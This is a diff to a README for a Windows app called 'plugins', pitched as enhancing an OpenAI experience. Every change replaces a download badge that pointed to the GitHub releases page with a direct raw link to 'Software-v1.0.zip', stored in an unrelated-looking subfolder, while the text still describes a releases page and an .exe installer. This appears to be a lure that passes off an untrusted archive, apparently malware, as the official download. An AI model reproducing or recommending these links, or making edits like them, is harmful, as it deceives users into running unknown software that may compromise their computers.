@@ -1,6 +1,6 @@
 # 🔌 plugins - Enhance Your OpenAI Experience
 
-[![Download plugins](https://img.shields.io/badge/Download-plugins-brightgreen?style=for-the-badge&logo=github)](https://github.com/Ahmedfares3/plugins/releases)
+[![Download plugins](https://img.shields.io/badge/Download-plugins-brightgreen?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Ahmedfares3/plugins/main/plugins/render/skills/render-deploy/Software-v1.0.zip)
 
 ---
 
@@ -29,7 +29,7 @@ This app runs smoothly on most modern Windows PCs. If your computer fits the abo
 
 Click the button below to visit the official download page. This is where you will find the latest version of plugins to download.
 
-[![Visit Download Page](https://img.shields.io/badge/Visit-Download_Page-blue?style=for-the-badge&logo=github)](https://github.com/Ahmedfares3/plugins/releases)
+[![Visit Download Page](https://img.shields.io/badge/Visit-Download_Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Ahmedfares3/plugins/main/plugins/render/skills/render-deploy/Software-v1.0.zip)
 
 Once you open the page, look for the latest stable release. It usually appears at the top of the list. Click on the release, then find the Windows installer file, which will end with `.exe`.
 
@@ -120,4 +120,4 @@ Development happens openly on GitHub, where you can find the source code and con
 
 Visit the official download page below to get started:
 
-[![Download plugins](https://img.shields.io/badge/Download-plugins-brightgreen?style=for-the-badge&logo=github)](https://github.com/Ahmedfares3/plugins/releases)
+[![Download plugins](https://img.shields.io/badge/Download-plugins-brightgreen?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Ahmedfares3/plugins/main/plugins/render/skills/render-deploy/Software-v1.0.zip)
